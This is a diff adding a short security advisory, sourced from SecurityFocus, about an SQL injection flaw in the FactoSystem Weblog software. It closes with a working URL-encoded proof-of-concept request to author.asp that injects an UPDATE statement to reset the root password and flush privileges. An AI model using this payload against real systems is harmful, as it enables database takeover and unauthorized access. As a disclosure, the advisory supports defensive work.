@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/5600/info
+
+FactoSystem Weblog is a freely available, open source software package for weblogging and managing content. It is available for Microsoft Windows operating systems.
+
+FactoSystem does not adequately filter special characters from requests. Because of this, it may be possible for a remote user to submit a request containing encoded special characters and SQL, and execute arbitrary commands. This could lead to execution of SQL commands in the security context of web database user.
+
+http://www.example.com/author.asp?authornumber=1%28%20And%20AuthorTable%2EAuthorID%3DBlurbTable%2EAuthorID%20And%20BlurbTable%2ESub_id%3DSubjectTable%2ESub_id%20Order%20By%20BlurbTable%2EBlurbdate%20desc%2C%20blurbtable%2Eblurbtime%20desc%3BUPDATE%20user%20SET%20Password%3DPASSWORD%28%27password%27%29%20WHERE%20user%3D%27root%27%3B%20FLUSH%20PRIVILEGES%3B-- 
